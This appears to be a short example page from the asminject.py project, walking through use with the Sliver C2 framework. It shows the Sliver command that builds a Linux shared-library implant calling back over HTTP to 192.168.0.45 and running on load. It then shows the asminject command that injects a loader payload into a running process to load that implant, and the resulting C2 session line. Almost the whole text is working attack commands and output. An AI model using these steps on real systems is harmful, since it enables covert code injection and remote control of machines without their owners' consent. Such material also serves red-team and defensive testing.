# asminject.py examples - Sliver
Examples related to [Bishop Fox's Sliver C2 framework](https://github.com/BishopFox/sliver)

* [Create and launch a Sliver shared library implant](#create-and-launch-a-sliver-shared-library-implant)

## Create and launch a Sliver shared library implant

Generate a Sliver implant binary for Linux using the shared library format, with the option to run at load enabled:

```
[server] sliver > generate --skip-symbols --http 192.168.0.45 --os linux --format shared --run-at-load

[*] Generating new linux/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 00:00:15
[*] Implant saved to /home/user/IMPORTANT_STRANGER.so
```

Inject the `dlinject_threaded.s` payload into the target process, e.g.:

```
# python3 ./asminject.py 93421 dlinject_threaded.s --arch x86-64 \
    --relative-offsets-from-binaries --stop-method "slow" \
	--var librarypath "/home/user/IMPORTANT_STRANGER.so"
```

Observe the session:

```
[*] Session 8a470c38 IMPORTANT_STRANGER - 192.168.0.45:35804 (kali) - linux/amd64 - Tue, 05 Jul 2022 16:59:10 PDT
```
